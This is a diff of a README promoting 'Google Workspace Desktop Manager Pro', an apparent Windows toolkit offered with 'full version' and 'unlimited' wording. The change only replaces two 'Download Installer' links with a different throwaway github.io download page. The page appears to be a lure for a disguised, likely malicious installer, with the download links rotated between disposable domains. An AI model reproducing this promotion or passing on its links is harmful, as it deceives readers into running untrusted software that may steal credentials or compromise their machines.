@@ -2,7 +2,7 @@
 
 Google Workspace Desktop Manager Pro is the ultimate Windows desktop application designed to streamline and enhance your entire Google Workspace experience. Whether you need to manage Google Drive storage, control admin settings, or access all your workspace productivity tools from a single unified interface, this comprehensive desktop toolkit has you covered. Built specifically for Windows 10 and Windows 11, it delivers a powerful desktop experience for anyone seeking full version functionality and unlimited productivity with their Google Workspace accounts in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
@@ -83,7 +83,7 @@ A: Google Workspace Desktop Manager Pro includes a built-in update checker that 
 
 Access the most recent version of Google Workspace Desktop Manager Pro through the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
